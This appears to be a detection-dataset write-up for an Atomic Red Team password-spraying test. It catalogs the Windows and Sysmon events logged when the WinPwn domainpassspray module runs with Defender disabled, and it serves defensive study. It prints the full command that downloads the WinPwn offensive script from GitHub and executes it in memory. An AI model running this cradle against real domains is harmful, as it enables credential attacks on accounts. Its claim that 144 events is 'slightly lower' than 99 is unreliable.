# T1110.003-5: Password Spraying — WinPwn - DomainPasswordSpray Attacks

## Technique Context

Password spraying (T1110.003) is a credential access technique where an adversary tests a single password against many accounts in order to avoid triggering per-account lockout thresholds. Test 5 in the T1110.003 series uses WinPwn rather than the standalone DomainPasswordSpray tool. WinPwn (by @S3cur3Th1sSh1t) is a comprehensive post-exploitation PowerShell framework that consolidates many offensive capabilities — credential dumping, lateral movement, domain enumeration, and password spraying — into a single script. Its `domainpassspray` module specifically targets accounts with empty passwords, a fast-win attempt before trying more sophisticated credential lists.

The technique proceeds through the same IEX/IWR pattern as DomainPasswordSpray but uses a different GitHub repository and different module invocation: `iex(new-object net.webclient).downloadstring(...)` followed by `domainpassspray -consoleoutput -noninteractive -emptypasswords`. The `-emptypasswords` flag means this test specifically looks for accounts with no password set — a realistic misconfiguration in improperly hardened environments.

In the defended variant, Windows Defender blocked execution before any authentication attempts occurred. This undefended dataset captures the complete execution path, including what the tool actually does when allowed to run.

## What This Dataset Contains

This dataset captures 144 events across four channels (1 Application, 109 PowerShell, 4 Security, 30 Sysmon) collected over a 4-second window (2026-03-14T23:48:09Z–23:48:13Z) on ACME-WS06 with Defender disabled.

**Application Channel (EID 15):**
A single Application event records `Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON`. This is an artifact of the ART test framework toggling Defender state between tests, not an action taken by the technique itself. The presence of this event is a consistent artifact of the undefended test series.

**Process Creation Chain (Security EID 4688 and Sysmon EID 1):**

The attack command, fully visible in Security EID 4688, is:

```
"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
domainpassspray -consoleoutput -noninteractive -emptypasswords}
```

This is the canonical WinPwn invocation, pinned to commit `121dcee`. The command uses `Net.WebClient.DownloadString()` rather than the IWR approach used in Test 2, which is a meaningful stylistic difference — both achieve in-memory execution without touching disk, but the `WebClient` approach is less commonly detected by older string-matching rules focused on `Invoke-WebRequest`.

An additional EID 4688 event records `MicrosoftEdgeUpdate.exe /ua /installsource core` launching as a background scheduled task unrelated to the attack — genuine OS background activity captured in the collection window.

**PowerShell Script Block Logging (EID 4104):**

107 EID 4104 events are present, almost entirely PowerShell runtime internal fragments (the same `Set-StrictMode`, `PSMessageDetails`, `ErrorCategory_Message` boilerplate seen across all tests). The WinPwn module code and `domainpassspray` invocation will appear in the 4104 stream when compiled from the downloaded string.

**Sysmon Process Creates (EID 1):**

Two `whoami.exe` process creation events (PIDs 4660 and 6908) are captured, both spawned from the parent PowerShell process (parent GUID `{9dc7570a-f3b8-69b5-5011-000000000600}`). The `whoami.exe` executions are ART test framework pre/post-test system identity checks, not WinPwn behavior. Notably, a Sysmon EID 1 for MicrosoftEdgeUpdate.exe appears (PID 4616) — this is background OS activity, not related to the attack.

**Sysmon File Create (EID 11):**

One EID 11 file creation event: `C:\Windows\Temp\01dcb40d01f38348` created by `MsMpEng.exe` (Windows Defender's main process). This is a Defender temporary file artifact from the test framework Defender toggle, not from the attack.

**Sysmon Image Loads (EID 7):**

18 EID 7 events document the .NET runtime DLL loading sequence for the attack PowerShell process (PID 4700): `mscoree.dll`, `mscoreei.dll`, `clr.dll`, `mscorlib.ni.dll`, `System.Management.Automation.ni.dll`. Same .NET CLR load pattern as all other PowerShell-based tests.

## What This Dataset Does Not Contain

- **Authentication events on the workstation:** Empty-password authentication attempts against domain accounts would generate EID 4625 (failed logon) or EID 4768/4771 (Kerberos) events on the domain controller, not the workstation. Those events are absent from this dataset.
- **Network connections to the domain controller:** Sysmon EID 3 events for LDAP/Kerberos traffic to ACME-DC01 are not present in the samples, suggesting either the tool's network activity to the DC occurred in a brief window outside the collection scope, or the DC connections were made by a process that Sysmon EID 3 filtering excluded.
- **The WinPwn source code in 4104:** The downloaded WinPwn script body is large; the 4104 events capturing its compiled scriptblocks are present in the full dataset but the 20-sample subset here shows only the runtime boilerplate fragments.
- **Successful credential matches:** The test used `-emptypasswords`, which would only succeed if domain accounts actually have empty passwords. No success indicators (EID 4624 successful logon) are present, consistent with a well-configured domain.

## Assessment

This dataset captures a complete WinPwn password spraying execution with Defender disabled, contrasting meaningfully with the defended variant (99 events: 51 PowerShell, 10 Security, 38 Sysmon). The overall event count here is slightly lower (144 vs. 99) but the composition differs: the defended dataset includes additional Security events from Defender's detection activity, while this dataset has fewer Security events because no detection interrupts the execution path.

The most significant forensic evidence is the full command line in Security EID 4688, which includes the exact WinPwn GitHub commit hash and the `-emptypasswords` flag. The use of `Net.WebClient.DownloadString()` rather than `Invoke-WebRequest` is a small but meaningful variation — adversaries sometimes rotate these download cradles specifically to evade string-matching detections, and having both patterns represented across Tests 2 and 5 makes this dataset set more useful for building robust coverage.

The Sysmon hash data on powershell.exe (SHA256: `D783BA6567FAF10FDFF2D0EA3864F6756862D6C733C7F4467283DA81AEDC3A80`) provides a stable binary baseline for the Windows 11 22H2 PowerShell executable used in this environment.

## Detection Opportunities Present in This Data

**EID 4688 / Sysmon EID 1 — WebClient DownloadString + WinPwn URL:**
The process creation command line contains `new-object net.webclient` combined with a GitHub raw URL pointing to WinPwn, followed by `domainpassspray`. The WinPwn repository name itself appears in the URL and is a reliable search term.

**EID 4104 — Script Block Logging:**
WinPwn's module code is captured as it compiles in memory. The `domainpassspray` function name and any internal WinPwn identifiers in 4104 content serve as durable indicators that survive obfuscation of the download URL.

**Sysmon EID 1 — Multiple whoami.exe Spawns from PowerShell:**
Two `whoami.exe` processes spawning from the same parent PowerShell process within seconds is an ART test framework artifact here, but the pattern of a PowerShell parent launching system discovery tools (whoami, net, ipconfig) in rapid succession is characteristic of post-exploitation reconnaissance and worth correlating with other indicators.

**Application EID 15 — Defender State Change:**
The `SECURITY_PRODUCT_STATE_ON` event in the Application log signals that something programmatically modified Defender's operational state. In a production environment, this event combined with subsequent suspicious PowerShell activity would warrant immediate investigation.
